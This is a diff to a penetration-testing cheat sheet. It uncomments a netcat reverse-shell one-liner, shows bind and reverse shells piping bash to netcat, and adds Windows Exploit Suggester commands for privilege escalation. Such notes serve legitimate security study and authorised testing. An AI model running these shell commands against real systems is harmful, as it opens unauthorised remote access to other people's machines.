@@ -617,7 +617,7 @@ $ /bin/sh -c "/bin/sh 0</tmp/backpipe | nc pentestbox 443 1>/tmp/backpipe"
 $ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lp <port> > /tmp/f
 
 # Alternative #3 - reverse shell
-# rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <host> <port> > /tmp/f
+$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <host> <port> > /tmp/f
 ```
 
 __##################### WARNING: METERPRETER PAYLOADS ARE RESTRICTED ####################__  
@@ -801,6 +801,13 @@ Windows privesc:
 * Requires restarting service for system to rerun as your exe.
 * Restarting might simply mean you have to access the service directly
     * E.g. `MYSQL> restart` rather than running commands on cmd to try restart.
+    
+Windows Exploit Suggester:
+```vb
+$ systeminfo > sys.info                                 # get sysinfo from Windows
+root@kali: python windows-exploit-suggester.py -u       # update exploit suggester
+root@kali: python windows-exploit-suggester -d <databasefile> -i <sysinfofile>
+```
     
 Find Running Services:
 ```
